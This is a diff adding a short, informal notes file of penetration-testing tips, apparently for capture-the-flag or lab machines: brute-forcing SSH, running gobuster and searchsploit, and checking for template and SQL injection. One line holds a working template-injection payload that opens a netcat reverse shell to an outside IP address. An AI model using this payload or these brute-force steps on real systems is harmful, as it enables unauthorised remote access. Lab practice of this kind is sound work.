@@ -1,0 +1,23 @@
+if u get default passwd brute force it in ssh
+
+read searchsploit and try it
+
+keep it simple
+
+run go buster if nothing appears
+
+search for versions ssh ,ftpp etc
+
+brute force ssh for sure
+
+look for txt file in go buster
+
+if there is a template look for ssti
+
+search domain name stti and use \    \  to make it work eg.
+
+"email":"aaa@aaa{{range.constructor(=="return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 5555 >/tmp/f')==")()}}"
+
+if dont find anything check js for some info .. i got sub domain in it
+
+when doing sql injection ... search for particular injections for database
